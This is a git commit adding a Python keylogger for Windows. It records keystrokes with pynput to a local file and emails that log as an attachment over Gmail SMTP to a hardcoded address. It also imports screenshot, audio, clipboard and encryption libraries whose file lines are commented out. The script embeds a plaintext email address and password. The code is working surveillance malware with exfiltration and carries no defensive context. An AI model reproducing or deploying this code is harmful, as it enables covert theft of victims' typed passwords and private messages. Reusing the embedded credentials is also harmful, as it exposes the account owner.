274440166d37579ef9b17bb87a76f0e4f7da95a1
Soham Pradhan <117765145+s-o-ham@users.noreply.github.com>
2025-04-26 16:54:05 +0530

    keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,125 @@
+#Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key,Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+# system_information = "system.txt"
+# audio_information = "audio.wav"
+# clipboard_information = "clipboard.txt"
+# screenshot_information = "screenshot.png"
+
+keys_information = "key_log.txt"
+email_address = "cyberxoofficial@gmail.com"
+password = "Netbash@13"
+
+toaddr = "cyberxoofficial@gmail.com"
+
+# system_information_e = 'e_system.txt'
+# clipboard_information_e = 'e_clipboard.txt'
+# keys_information_e = 'e_keys_logged.txt'
+
+file_path = "C:\\Users\\soham\\PycharmProjects\\Trial\\Project"
+extend = "\\"
+
+
+def send_email(filename, attachment, toaddr):
+    fromaddr = email_address
+    msg = MIMEMultipart()
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = "Keylogger File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+
+    p.set_payload(attachment.read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count
+
+    print(key)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+        # try:
+        #     send_email(keys_information, file_path + extend + keys_information, toaddr)
+        # except Exception as e:
+        #     print(f"Failed to send email: {e}")
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space")>0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
